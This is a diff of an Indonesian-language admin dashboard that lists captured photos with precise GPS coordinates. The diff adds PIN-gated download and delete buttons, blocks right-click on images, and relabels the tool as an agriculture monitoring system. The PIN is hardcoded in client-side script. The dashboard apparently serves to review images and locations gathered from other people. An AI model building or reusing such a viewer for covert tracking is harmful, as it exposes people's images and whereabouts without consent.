@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>CropzX Admin</title>
+<title>Admin Satu CropzX - Dashboard Gambar & Lokasi</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap');
 
@@ -14,6 +14,8 @@
     --accent: #4caf50;
     --btn-danger: #e53935;
     --btn-danger-hover: #b71c1c;
+    --btn-download: #2196F3;
+    --btn-download-hover: #0b7dda;
     --shadow: rgba(0,0,0,0.8);
   }
 
@@ -45,35 +47,36 @@
 
   main {
     flex: 1;
-    padding: 1.5rem 2rem;
+    padding: 1.5rem;
     display: grid;
-    grid-template-columns: repeat(auto-fill,minmax(280px,1fr));
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
     gap: 1.3rem;
     overflow-y: auto;
   }
 
   .card {
     background: var(--card-bg);
-    border-radius: 12px;
-    box-shadow: 0 8px 20px var(--shadow);
+    border-radius: 8px;
+    box-shadow: 0 4px 12px var(--shadow);
     display: flex;
     flex-direction: column;
     transition: transform 0.3s ease, box-shadow 0.3s ease;
     cursor: default;
     animation: fadeInUp 0.5s ease forwards;
     opacity: 0;
+    overflow: hidden;
+    height: fit-content;
   }
   .card:hover {
-    transform: scale(1.04);
-    box-shadow: 0 14px 30px var(--shadow);
+    transform: translateY(-5px);
+    box-shadow: 0 8px 20px var(--shadow);
   }
 
   .img-container {
     width: 100%;
     aspect-ratio: 4/3;
     overflow: hidden;
-    border-top-left-radius: 12px;
-    border-top-right-radius: 12px;
+    position: relative;
   }
 
   .img-container img {
@@ -81,22 +84,47 @@
     height: 100%;
     object-fit: cover;
     transition: transform 0.3s ease;
+    pointer-events: none;
+    user-select: none;
+    -webkit-user-drag: none;
   }
   .card:hover .img-container img {
-    transform: scale(1.1);
+    transform: scale(1.05);
+  }
+
+  .img-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.3);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+  }
+  .card:hover .img-overlay {
+    opacity: 1;
+  }
+  .img-overlay span {
+    color: white;
+    background: rgba(0,0,0,0.7);
+    padding: 0.5rem 1rem;
+    border-radius: 20px;
+    font-size: 0.9rem;
   }
 
   .info {
-    padding: 1rem 1.2rem 1.4rem;
-    flex-grow: 1;
+    padding: 0.8rem;
     display: flex;
     flex-direction: column;
-    justify-content: space-between;
+    gap: 0.5rem;
   }
 
   .details {
-    font-size: 0.95rem;
-    margin-bottom: 0.8rem;
+    font-size: 0.85rem;
     color: #bbb;
     line-height: 1.3;
     word-break: break-word;
@@ -107,57 +135,75 @@
   }
 
   .location {
-    margin-top: 0.5rem;
-    font-size: 0.85rem;
+    font-size: 0.8rem;
     color: #888;
-    font-style: italic;
   }
 
   .location a {
     color: #4caf50;
     text-decoration: none;
+    font-style: italic;
   }
 
   .location a:hover {
     text-decoration: underline;
   }
 
-  footer {
-    padding: 0.7rem 2rem;
+  .card-actions {
+    display: flex;
+    gap: 0.5rem;
+    margin-top: 0.5rem;
+  }
+
+  .card-btn {
+    border: none;
+    color: white;
+    font-weight: 600;
+    border-radius: 5px;
+    padding: 0.4rem 0.8rem;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    font-size: 0.8rem;
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.3rem;
+  }
+
+  .card-btn i {
     font-size: 0.9rem;
+  }
+
+  .download-btn {
+    background: var(--btn-download);
+  }
+  .download-btn:hover {
+    background: var(--btn-download-hover);
+  }
+
+  .delete-btn {
+    background: var(--btn-danger);
+  }
+  .delete-btn:hover {
+    background: var(--btn-danger-hover);
+  }
+
+  footer {
+    padding: 0.7rem;
+    font-size: 0.8rem;
     color: #555;
     border-top: 1px solid #333;
     text-align: center;
   }
 
-  button.delete-btn {
-    background: var(--btn-danger);
-    border: none;
-    color: white;
-    font-weight: 600;
-    border-radius: 30px;
-    padding: 0.5rem 1rem;
-    cursor: pointer;
-    box-shadow: 0 4px 12px var(--btn-danger);
-    transition: background-color 0.3s ease, transform 0.2s ease;
-    align-self: flex-start;
-    user-select: none;
-  }
-  button.delete-btn:hover {
-    background: var(--btn-danger-hover);
-    transform: scale(1.1);
-  }
-  button.delete-btn:active {
-    transform: scale(0.95);
-  }
-
   .no-data {
     grid-column: 1/-1;
     text-align: center;
-    font-size: 1.3rem;
+    font-size: 1.1rem;
     font-weight: 500;
     color: #777;
-    margin-top: 5rem;
+    margin-top: 3rem;
     user-select: none;
   }
 
@@ -184,27 +230,35 @@
 
   .pin-container {
     background: var(--card-bg);
-    padding: 2rem;
-    border-radius: 12px;
+    padding: 1.5rem;
+    border-radius: 8px;
     width: 90%;
-    max-width: 400px;
+    max-width: 350px;
     text-align: center;
   }
 
   .pin-container h3 {
     margin-top: 0;
+    margin-bottom: 0.5rem;
     color: var(--accent);
+    font-size: 1.2rem;
+  }
+
+  .pin-desc {
+    font-size: 0.9rem;
+    color: #aaa;
+    margin-bottom: 1rem;
   }
 
   .pin-input {
     width: 100%;
-    padding: 0.8rem;
-    margin: 1rem 0;
-    border-radius: 8px;
+    padding: 0.7rem;
+    margin-bottom: 1rem;
+    border-radius: 5px;
     border: 2px solid #333;
     background: #2a2a2a;
     color: white;
-    font-size: 1.2rem;
+    font-size: 1.1rem;
     text-align: center;
     letter-spacing: 0.2em;
   }
@@ -212,17 +266,18 @@
   .pin-buttons {
     display: flex;
     justify-content: space-between;
-    gap: 1rem;
+    gap: 0.8rem;
   }
 
   .pin-buttons button {
     flex: 1;
-    padding: 0.8rem;
+    padding: 0.7rem;
     border: none;
-    border-radius: 8px;
+    border-radius: 5px;
     font-weight: 600;
     cursor: pointer;
     transition: background 0.2s ease;
+    font-size: 0.9rem;
   }
 
   .pin-confirm {
@@ -237,36 +292,37 @@
 
   .pin-error {
     color: var(--btn-danger);
-    font-size: 0.9rem;
-    margin-top: 0.5rem;
+    font-size: 0.85rem;
+    margin-bottom: 0.5rem;
     min-height: 1.2rem;
   }
 
   @keyframes fadeInUp {
     from {
       opacity: 0;
-      transform: translateY(20px);
+      transform: translateY(15px);
     } to {
       opacity: 1;
       transform: translateY(0);
     }
   }
 </style>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
-<header>CropzX - BY Warz Gambar X Lokasi</header>
+<header>Satu CropzX - Dashboard Admin</header>
 <main id="container">
   <!-- Cards will be appended here -->
 </main>
 <footer>
-  &copy; 2025 CropzX Admin dashboard
+  &copy; 2025 Satu CropzX - Sistem Pemantauan Pertanian Digital
 </footer>
 
 <!-- PIN Verification Modal -->
 <div class="pin-modal" id="pinModal">
   <div class="pin-container">
-    <h3>Verifikasi PIN</h3>
-    <p>Masukkan PIN untuk menghapus data</p>
+    <h3 id="pinTitle">Verifikasi PIN</h3>
+    <p class="pin-desc" id="pinDesc">Masukkan PIN untuk melanjutkan</p>
     <input type="password" class="pin-input" id="pinInput" maxlength="4" placeholder="****">
     <div class="pin-error" id="pinError"></div>
     <div class="pin-buttons">
@@ -279,8 +335,10 @@
 <script>
   const storageKey = 'binjson_data';
   const correctPIN = '2903'; // PIN yang benar
-  let currentEntryToDelete = null;
+  let currentAction = null; // 'delete' or 'download'
+  let currentEntryId = null;
   let currentCardElement = null;
+  let currentImageUrl = null;
 
   // Load data from localStorage
   function loadData() {
@@ -300,7 +358,13 @@
 
   function formatTimestamp(ts) {
     const d = new Date(ts);
-    return d.toLocaleString('id-ID');
+    return d.toLocaleString('id-ID', {
+      day: '2-digit',
+      month: '2-digit',
+      year: 'numeric',
+      hour: '2-digit',
+      minute: '2-digit'
+    });
   }
 
   function createCard(entry) {
@@ -316,7 +380,12 @@
     img.src = image;
     img.alt = 'Gambar yang diambil';
 
+    const imgOverlay = document.createElement('div');
+    imgOverlay.className = 'img-overlay';
+    imgOverlay.innerHTML = '<span>Gunakan tombol dibawah untuk download</span>';
+
     imgCont.appendChild(img);
+    imgCont.appendChild(imgOverlay);
 
     const info = document.createElement('div');
     info.className = 'info';
@@ -329,27 +398,45 @@
     let locText = 'Lokasi: Tidak tersedia';
     if (location) {
       const mapsLink = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
-      locText = `Lokasi: <a href="${mapsLink}" target="_blank">${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)} (±${location.accuracy ? location.accuracy.toFixed(1) + 'm' : 'N/A'})</a>`;
+      locText = `Lokasi: <a href="${mapsLink}" target="_blank" title="Buka di Google Maps">${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)} (±${location.accuracy ? location.accuracy.toFixed(1) + 'm' : 'N/A'})</a>`;
     }
 
     const locationEl = document.createElement('div');
     locationEl.className = 'location';
     locationEl.innerHTML = locText;
 
-    const deleteBtn = document.createElement('button');
-    deleteBtn.className = 'delete-btn';
-    deleteBtn.textContent = 'Hapus';
-    deleteBtn.title = 'Hapus data ini';
+    const actions = document.createElement('div');
+    actions.className = 'card-actions';
 
-    deleteBtn.onclick = () => {
-      currentEntryToDelete = id;
+    const downloadBtn = document.createElement('button');
+    downloadBtn.className = 'card-btn download-btn';
+    downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download';
+    downloadBtn.title = 'Download gambar';
+    downloadBtn.onclick = () => {
+      currentAction = 'download';
+      currentEntryId = id;
       currentCardElement = card;
-      showPinModal();
+      currentImageUrl = image;
+      showPinModal('Download Gambar', 'Masukkan PIN untuk download gambar');
     };
+
+    const deleteBtn = document.createElement('button');
+    deleteBtn.className = 'card-btn delete-btn';
+    deleteBtn.innerHTML = '<i class="fas fa-trash"></i> Hapus';
+    deleteBtn.title = 'Hapus data ini';
+    deleteBtn.onclick = () => {
+      currentAction = 'delete';
+      currentEntryId = id;
+      currentCardElement = card;
+      showPinModal('Hapus Data', 'Masukkan PIN untuk menghapus data');
+    };
+
+    actions.appendChild(downloadBtn);
+    actions.appendChild(deleteBtn);
 
     info.appendChild(details);
     info.appendChild(locationEl);
-    info.appendChild(deleteBtn);
+    info.appendChild(actions);
 
     card.appendChild(imgCont);
     card.appendChild(info);
@@ -357,11 +444,15 @@
     return card;
   }
 
-  function showPinModal() {
+  function showPinModal(title, description) {
     const modal = document.getElementById('pinModal');
+    const pinTitle = document.getElementById('pinTitle');
+    const pinDesc = document.getElementById('pinDesc');
     const pinInput = document.getElementById('pinInput');
     const pinError = document.getElementById('pinError');
     
+    pinTitle.textContent = title;
+    pinDesc.textContent = description;
     pinInput.value = '';
     pinError.textContent = '';
     modal.classList.add('active');
@@ -378,7 +469,11 @@
     const pinError = document.getElementById('pinError');
     
     if (pinInput.value === correctPIN) {
-      deleteEntry(currentEntryToDelete, currentCardElement);
+      if (currentAction === 'delete') {
+        deleteEntry(currentEntryId, currentCardElement);
+      } else if (currentAction === 'download') {
+        downloadImage(currentImageUrl);
+      }
       hidePinModal();
     } else {
       pinError.textContent = 'PIN salah! Silakan coba lagi.';
@@ -387,18 +482,28 @@
     }
   }
 
+  function downloadImage(imageUrl) {
+    // Create temporary anchor element to trigger download
+    const a = document.createElement('a');
+    a.href = imageUrl;
+    a.download = `satu_cropzx_${currentEntryId}_${Date.now()}.jpg`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }
+
   function deleteEntry(id, cardElement) {
     let data = loadData();
     data = data.filter(e => e.id !== id);
     saveData(data);
     // Animate removal
-    cardElement.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
+    cardElement.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
     cardElement.style.opacity = '0';
-    cardElement.style.transform = 'scale(0.8) translateX(-20px)';
+    cardElement.style.transform = 'scale(0.9) translateX(-20px)';
     setTimeout(() => {
       cardElement.remove();
       checkNoData();
-    }, 400);
+    }, 300);
   }
 
   function checkNoData() {
@@ -431,6 +536,13 @@
   document.getElementById('pinInput').addEventListener('keypress', (e) => {
     if (e.key === 'Enter') {
       verifyPin();
+    }
+  });
+
+  // Prevent image drag/download
+  document.addEventListener('contextmenu', (e) => {
+    if (e.target.tagName === 'IMG') {
+      e.preventDefault();
     }
   });
 
